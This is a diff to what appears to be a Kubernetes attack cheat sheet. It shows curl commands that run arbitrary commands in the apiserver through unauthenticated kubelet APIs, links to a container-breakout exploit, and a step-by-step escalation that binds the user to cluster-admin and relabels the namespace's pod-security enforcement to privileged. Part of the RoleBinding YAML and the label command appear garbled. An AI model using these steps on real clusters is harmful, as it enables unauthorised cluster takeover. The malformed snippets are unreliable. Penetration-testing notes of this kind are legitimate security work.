@@ -17,11 +17,17 @@ Kubelet rw API (no authentication)
 			
 	curl -X POST https://172.18.0.4:10250/run/kube-system/kube-apiserver-<cluster_name>-control-plane/kube-apiserver -k -d "cmd=<command>"
 
+		`cat` no longer works in the control plane containers - running distroless
 
 Kubelet ro API (no authentication)
 	curl http://172.18.0.4:10255/pods -k | jq | grep apiserver
 			
 	curl -X POST http://172.18.0.4:10255/run/kube-system/kube-apiserver-<cluster_name>-control-plane/kube-apiserver -k -d "cmd=<command>"
+
+	DoS - https://github.com/kubernetes/kubernetes/issues/130016
+		kubelet v1.32.0 to v1.32.1
+		kubelet v1.31.0 to v1.31.5
+		kubelet v1.30.0 to v1.30.9
 
 
 Kubernetes Dashboard (no authentication)
@@ -116,9 +122,44 @@ Exposed Kubernetes REST API Attack
 	Create WebSocket connect to routing
 		wscat -c "https://<DOMAIN>:<PORT>/<Location Header Value>"" --no-check
 
+Container Breakout
+	https://xint.io/blog/copy-fail-linux-distributions
+	https://github.com/theori-io/copy-fail-CVE-2026-31431
+
+
 Kernel Breakout
 	see Docker section
 	depends on kernel version and container restrictions
+
+
+CI/CD Breakout
+	Can create a malicious deployment, but it won't deploy (e.g. PodSecurity Restricted)
+
+	1 - Create RoleBinding within allowed namespace
+
+	apiVersion: rbac.authorization.k8s.io/v1
+	kind: RoleBinding
+	metadata:
+	labels:
+	  app.kubernetes.io/instance: let-myself-in
+	 name: developer-to-cluster-admin
+	 namespace: <my_namespace>
+	roleRef:
+	  apiGroup: rbac.authorization.k8s.io
+	  kind: ClusterRole
+	  name: cluster-admin
+	 subjects:
+	   - apiGroup: rbac.authorization.k8s.io
+	     kind: User
+	     name: <my_user_name>
+
+	2 - Relabel allowed namespace from within that namespace
+
+	kubectl label --overwrite ns/<my_namespace> pod-security.kubernetes.io/enforce*privileged
+
+	3 - Restart deployment (should now work)
+
+	kubectl -n <my_namespace> rollout restart deployment/<deployment_name>
 
 K8s rights are additive 
 	if a right is in ABAC or RBAC or Webhook, that right will be given
